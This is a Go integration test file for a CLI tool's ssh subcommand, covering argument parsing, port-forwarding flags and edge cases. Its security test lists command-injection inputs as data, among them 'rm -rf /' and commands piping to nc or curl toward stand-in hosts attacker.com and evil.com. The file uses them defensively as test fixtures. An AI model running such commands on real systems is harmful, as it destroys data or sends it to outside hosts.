package integration_test

import (
	"testing"

	"github.com/ocfp/ocfp-cli-go/internal/commands"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestSSHCommandWithArguments(t *testing.T) {
	t.Parallel()

	t.Run("AcceptsNoArguments", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		err := cmd.Args(cmd, []string{})
		require.NoError(t, err, "SSH command should accept no arguments")
	})

	t.Run("AcceptsSingleArgument", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		err := cmd.Args(cmd, []string{"bastion"})
		require.NoError(t, err, "SSH command should accept single argument")
	})

	t.Run("AcceptsMultipleArguments", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		err := cmd.Args(cmd, []string{"bastion", "hostname"})
		require.NoError(t, err, "SSH command should accept multiple arguments")
	})

	t.Run("AcceptsSSHFlags", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		err := cmd.Args(cmd, []string{"-L", "8080:localhost:80", "bastion"})
		require.NoError(t, err, "SSH command should accept SSH flags")
	})

	t.Run("AcceptsFlagsAndCommand", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		err := cmd.Args(cmd, []string{"-L", "8080:localhost:80", "bastion", "uptime"})
		require.NoError(t, err, "SSH command should accept flags and command")
	})

	t.Run("AcceptsCommandWithMultipleArgs", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		err := cmd.Args(cmd, []string{"bastion", "ls", "-la", "/tmp"})
		require.NoError(t, err, "SSH command should accept command with multiple arguments")
	})

	t.Run("AcceptsMultiStatementCommand", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		err := cmd.Args(cmd, []string{"bastion", "ls", ";", "hostname", ";", "echo", "$OCFP_BLOC"})
		require.NoError(t, err, "SSH command should accept multi-statement command")
	})

	t.Run("CommandUseUpdated", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		assert.Equal(t, "ssh [target] [command...]", cmd.Use, "Command use should show optional command")
	})

	t.Run("ExamplesIncludeCommandExecution", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		assert.Contains(t, cmd.Example, "hostname", "Examples should include command execution")
		assert.Contains(t, cmd.Example, "Port forwarding", "Examples should include port forwarding")
	})
}

func TestSSHArgumentParsing(t *testing.T) {
	t.Parallel()

	testCases := []struct {
		name        string
		args        []string
		description string
	}{
		{
			name:        "NoArgs",
			args:        []string{},
			description: "Default to bastion with interactive session",
		},
		{
			name:        "OnlyTarget",
			args:        []string{"10.0.0.1"},
			description: "Connect to specific host interactively",
		},
		{
			name:        "TargetAndSimpleCommand",
			args:        []string{"bastion", "hostname"},
			description: "Execute simple command on bastion",
		},
		{
			name:        "TargetAndComplexCommand",
			args:        []string{"bastion", "ls", "/tmp", "&&", "echo", "done"},
			description: "Execute complex command with multiple parts",
		},
		{
			name:        "LocalPortForwarding",
			args:        []string{"-L", "8080:localhost:80", "bastion"},
			description: "Setup local port forwarding",
		},
		{
			name:        "RemotePortForwarding",
			args:        []string{"-R", "9090:localhost:8080", "bastion"},
			description: "Setup remote port forwarding",
		},
		{
			name:        "DynamicPortForwarding",
			args:        []string{"-D", "1080", "bastion"},
			description: "Setup dynamic port forwarding (SOCKS)",
		},
		{
			name:        "MultipleSSHFlags",
			args:        []string{"-L", "8080:localhost:80", "-v", "bastion"},
			description: "Multiple SSH flags together",
		},
		{
			name:        "FlagsAndCommand",
			args:        []string{"-L", "8080:localhost:80", "bastion", "uptime"},
			description: "SSH flags with remote command",
		},
		{
			name:        "VerboseMode",
			args:        []string{"-vvv", "bastion", "hostname"},
			description: "Verbose SSH with command",
		},
		{
			name:        "CustomPort",
			args:        []string{"-p", "2222", "bastion"},
			description: "Connect on non-standard port",
		},
		{
			name:        "ConfigOption",
			args:        []string{"-o", "ServerAliveInterval=60", "bastion", "uptime"},
			description: "Pass SSH config option",
		},
		{
			name:        "QuotedCommand",
			args:        []string{"bastion", "echo", "'Hello World'"},
			description: "Command with quoted arguments",
		},
		{
			name:        "CommandWithPipe",
			args:        []string{"bastion", "ps", "aux", "|", "grep", "bash"},
			description: "Command with pipe",
		},
		{
			name:        "EnvironmentVariable",
			args:        []string{"bastion", "echo", "$HOME"},
			description: "Command with environment variable",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			cmd := commands.NewSSHCmd()
			err := cmd.Args(cmd, tc.args)
			assert.NoError(t, err, "Args validation failed for: %s", tc.description)
		})
	}
}

func TestBackwardCompatibility(t *testing.T) {
	t.Parallel()

	t.Run("DefaultBastionTarget", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		// No args should still work (defaults to bastion)
		err := cmd.Args(cmd, []string{})
		assert.NoError(t, err, "Should accept no arguments for backward compatibility")
	})

	t.Run("SingleTargetArgument", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		// Single target arg should still work
		err := cmd.Args(cmd, []string{"bastion"})
		assert.NoError(t, err, "Should accept single target argument for backward compatibility")
	})

	t.Run("ExistingFlagsStillWork", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()

		// Verify existing flags are still present
		assert.NotNil(t, cmd.Flags().Lookup("user"), "User flag should exist")
		assert.NotNil(t, cmd.Flags().Lookup("key"), "Key flag should exist")
		assert.NotNil(t, cmd.Flags().Lookup("ssh-options"), "SSH options flag should exist")
	})
}

func TestEdgeCases(t *testing.T) {
	t.Parallel()

	t.Run("EmptyCommandString", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		err := cmd.Args(cmd, []string{"bastion", ""})
		assert.NoError(t, err, "Should handle empty command string")
	})

	t.Run("SpecialCharactersInCommand", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		specialChars := []string{"bastion", "echo", "$PATH", "&&", "echo", "$(whoami)"}
		err := cmd.Args(cmd, specialChars)
		assert.NoError(t, err, "Should handle special characters in command")
	})

	t.Run("LongCommandString", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		longCmd := []string{"bastion"}
		for i := 0; i < 50; i++ {
			longCmd = append(longCmd, "echo", "test")
		}
		err := cmd.Args(cmd, longCmd)
		assert.NoError(t, err, "Should handle very long command strings")
	})

	t.Run("MixedFlagsAndValues", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()
		mixed := []string{"-v", "-L", "8080:localhost:80", "bastion", "-t", "ls"}
		err := cmd.Args(cmd, mixed)
		assert.NoError(t, err, "Should handle mixed flags and command arguments")
	})
}

func TestSecurityValidation(t *testing.T) {
	t.Parallel()

	t.Run("AllowedSSHFlags", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()

		allowedFlags := [][]string{
			{"-v", "bastion"},
			{"-vvv", "bastion"},
			{"-L", "8080:localhost:80", "bastion"},
			{"-R", "9090:localhost:8080", "bastion"},
			{"-D", "1080", "bastion"},
			{"-p", "2222", "bastion"},
			{"-o", "ServerAliveInterval=60", "bastion"},
			{"-4", "bastion"},
			{"-6", "bastion"},
		}

		for _, args := range allowedFlags {
			err := cmd.Args(cmd, args)
			assert.NoError(t, err, "Should accept allowed SSH flag: %v", args)
		}
	})

	t.Run("CommandInjectionPatterns", func(t *testing.T) {
		t.Parallel()

		cmd := commands.NewSSHCmd()

		// These should be accepted by Args validation but handled safely by buildSSHCommand
		injectionPatterns := [][]string{
			{"bastion", "ls", ";", "rm", "-rf", "/"},
			{"bastion", "echo", "$(malicious)"},
			{"bastion", "test", "|", "nc", "attacker.com"},
			{"bastion", "test", "&&", "curl", "evil.com"},
		}

		for _, args := range injectionPatterns {
			err := cmd.Args(cmd, args)
			// Args validation should accept these - security is enforced in command execution
			assert.NoError(t, err, "Args validation accepts pattern (security enforced elsewhere): %v", args)
		}
	})
}
